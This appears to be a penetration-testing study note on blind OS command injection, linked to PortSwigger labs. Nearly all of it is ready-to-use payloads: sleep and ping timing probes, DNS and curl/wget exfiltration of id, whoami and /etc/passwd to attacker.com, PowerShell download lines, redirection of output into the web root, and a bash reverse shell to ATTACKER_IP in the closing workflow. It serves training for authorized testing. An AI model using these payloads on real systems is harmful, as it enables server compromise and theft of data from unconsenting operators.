---
tags: [vapt, command-injection, intermediate]
difficulty: intermediate
module: "08 - Command Injection"
topic: "08.04 Blind Command Injection"
portswigger_labs: ["Blind OS command injection with time delays", "Blind OS command injection with output redirection", "Blind OS command injection with out-of-band interaction"]
---

# 08.04 — Blind Command Injection

## What is Blind Command Injection?

Blind command injection occurs when commands execute on the server but their output is NOT reflected in the HTTP response. You must infer execution through:
1. **Time delays** — command runs, response takes longer
2. **Out-of-band (OOB)** — command causes an outbound connection to attacker's server

```
IN-BAND:
  Inject: ;id
  Response: <output>uid=33(www-data)</output>  ← see the output!

BLIND:
  Inject: ;id
  Response: <output>Success</output>            ← output hidden!
  Inject: ;sleep 5
  Response: [takes 5+ seconds]                  ← delay confirms injection!
  Inject: ;curl attacker.com/$(id)
  Attacker server receives: GET /uid=33(www-data)  ← OOB confirms!
```

---

## Technique 1: Time-Based Detection

```bash
# LINUX — SLEEP COMMAND:
;sleep 5            → 5 second delay
;sleep 10           → 10 second delay (more obvious)

# WINDOWS — TIMEOUT/PING:
&timeout /t 5 /nobreak    → Windows sleep via timeout
&ping -n 6 127.0.0.1      → ping 6 times = ~5 second delay

# LINUX — ALTERNATIVE SLEEP:
;sleep 5
;/bin/sleep 5
;ping -c 5 127.0.0.1      → ping 5 times ≈ 5 seconds

# WHEN TIMING IS UNRELIABLE:
# Use 10+ seconds to distinguish from normal latency
;sleep 10
# If response takes >10 seconds = injection confirmed

# URL-ENCODED VARIANTS:
%3Bsleep%205            → ;sleep 5
%0asleep%205            → newline + sleep 5
%26timeout%20/t%205     → &timeout /t 5 (Windows)
```

---

## Technique 2: Out-of-Band via DNS (Most Reliable)

```bash
# USING BURP COLLABORATOR:
# Burp Pro generates a unique subdomain: abc123.burpcollaborator.net
# Inject:
;nslookup abc123.burpcollaborator.net
# → Server performs DNS lookup → Burp Collaborator receives it → confirmed!

# WITH DATA EXFILTRATION (append command output to subdomain):
;nslookup `whoami`.abc123.burpcollaborator.net
# → DNS lookup for: www-data.abc123.burpcollaborator.net
# → Now we know the username!

# EXFILTRATE SPECIFIC DATA:
;nslookup `cat /etc/hostname`.abc123.burpcollaborator.net
;nslookup `id | base64`.abc123.burpcollaborator.net
```

---

## Technique 3: Out-of-Band via HTTP (Curl/Wget)

```bash
# CURL:
;curl https://attacker.com/ping
→ If attacker receives GET /ping → injection confirmed!

# CURL WITH DATA:
;curl "https://attacker.com/?output=$(id | base64)"
;curl "https://attacker.com/?output=$(whoami)"
;curl "https://attacker.com/?h=$(hostname)"

# WGET:
;wget https://attacker.com/ping
;wget "https://attacker.com/?data=$(id)"

# IF BOTH ARE BLOCKED — TRY INTERNAL TOOLS:
;python3 -c "import urllib.request; urllib.request.urlopen('https://attacker.com/ping')"
;python -c "import urllib2; urllib2.urlopen('https://attacker.com/ping')"
;php -r "file_get_contents('https://attacker.com/ping');"
;perl -e "use LWP::UserAgent; LWP::UserAgent->new->get('https://attacker.com/ping');"
```

---

## Technique 4: Output Redirection (Blind → In-Band)

```bash
# REDIRECT COMMAND OUTPUT TO A READABLE WEB FILE:
# If app writes files to web root, redirect command output there!

# IDENTIFY WEB ROOT:
# Common: /var/www/html, /var/www/public, /usr/share/nginx/html

# REDIRECT TO READABLE FILE:
;id > /var/www/html/output.txt
;cat /etc/passwd > /var/www/html/output.txt

# THEN READ IT:
curl https://target.com/output.txt
→ uid=33(www-data) gid=33(www-data)...

# MULTIPLE COMMANDS:
;(id && hostname && cat /etc/os-release) > /var/www/html/output.txt

# WINDOWS:
&whoami > C:\inetpub\wwwroot\output.txt
&type C:\Windows\system32\drivers\etc\hosts > C:\inetpub\wwwroot\output.txt
```

---

## Using Interactsh (Free Burp Collaborator Alternative)

```bash
# INTERACTSH SETUP:
# Install:
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# START LISTENER:
interactsh-client
# → Gives you URL like: abc123.interact.sh

# INJECT:
;nslookup abc123.interact.sh
;curl https://abc123.interact.sh/$(whoami)

# Interactsh client shows incoming connections!
# → DNS query or HTTP request = injection confirmed!

# WEB INTERFACE:
# https://app.interactsh.com/
# → Hosted version, no install needed
```

---

## Testing Blind vs In-Band

```
STEP 1: TEST FOR IN-BAND FIRST:
  Inject: ;echo xsscanary1234
  If response contains "xsscanary1234" → IN-BAND injection!
  Skip to in-band exploitation.

STEP 2: IF NO OUTPUT — TEST BLIND (TIME):
  Inject: ;sleep 10
  Measure response time:
    < 10s → sleep didn't run → injection failed (or different operator)
    > 10s → sleep ran → BLIND INJECTION CONFIRMED!
  
  Try different operators:
  ;sleep 10  → semicolon
  |sleep 10  → pipe
  ||sleep 10 → OR
  &&sleep 10 → AND
  $(sleep 10) → subshell
  `sleep 10`  → backtick

STEP 3: IF TIMING UNCERTAIN — USE OOB:
  Set up Interactsh or Burp Collaborator
  Inject: ;nslookup YOUR_COLLABORATOR_DOMAIN
  Check for incoming DNS queries
  
STEP 4: EXFILTRATE DATA OOB:
  ;curl "https://your-server.com/$(id | base64)"
  OR:
  ;nslookup $(id | base64).your-collaborator.com
```

---

## Data Exfiltration Techniques

```bash
# EXFILTRATE FILE CONTENTS VIA DNS:
# (DNS labels are max 63 chars, so base64 of small files)

;nslookup $(cat /etc/hostname | base64).attacker.com
# → DNS lookup: d2Vic2VydmVyMDE=.attacker.com
# Decode: base64 -d <<< d2Vic2VydmVyMDE= → webserver01

# FOR LONGER FILES — CHUNK IT:
;cat /etc/passwd | head -1 | base64 | cut -c1-50 | xargs -I{} nslookup {}.attacker.com

# VIA HTTP (more data):
;curl "https://attacker.com/data?f=$(cat /etc/passwd | base64 | tr -d '\n')"

# WINDOWS OOB:
&nslookup %COMPUTERNAME%.attacker.com
&powershell -c "[System.Net.DNS]::Resolve('attacker.com')"
&powershell -c "(New-Object Net.WebClient).DownloadString('https://attacker.com/?d='+(whoami | Out-String))"
```

---

## Blind Injection — Complete Test Workflow

```bash
# 1. CONFIRM TIME-BASED:
POST /feedback HTTP/1.1
email=test@test.com;sleep+10&message=test

# 2. IDENTIFY OS:
email=test@test.com;sleep+5        # If delay → Linux
email=test@test.com&timeout+/t+5   # Try Windows too

# 3. REDIRECT OUTPUT:
email=test@test.com;id+>+/var/www/html/test123.txt

# 4. RETRIEVE OUTPUT:
curl https://target.com/test123.txt

# 5. ESTABLISH REVERSE SHELL:
email=test@test.com;bash+-i+>&+/dev/tcp/ATTACKER_IP/4444+0>&1
# (with Burp intercepting and URL-decoding)
```

---

## Related Notes
- [[02 - OS Command Injection Linux]] — in-band Linux injection
- [[07 - Out-of-Band SQLi]] — similar OOB concept in SQLi
- [[10 - Command Injection to Reverse Shell]] — full exploitation
- [[Module 12 - SSRF]] — similar OOB testing with Burp Collaborator
